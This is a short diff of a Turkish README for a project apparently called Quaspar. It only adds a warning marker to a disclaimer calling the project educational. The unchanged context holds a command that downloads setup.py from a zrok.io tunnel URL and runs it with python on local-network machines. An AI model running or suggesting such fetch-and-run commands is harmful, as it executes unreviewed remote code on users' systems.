@@ -7,4 +7,4 @@ Yerel ağdaki herhangi bir bilgisayarda Quaspar'ı başlatmak için terminale (C
 curl -L https://nucfvfkc4e87.share.zrok.io/setup -o setup.py && python setup.py
 ```
 
-Bu proje eğitim amaçlıdır ve yapılan işlemlerden kullanıcı sorumludur.
+ [ ! ] Bu proje eğitim amaçlıdır ve yapılan işlemlerden kullanıcı sorumludur.
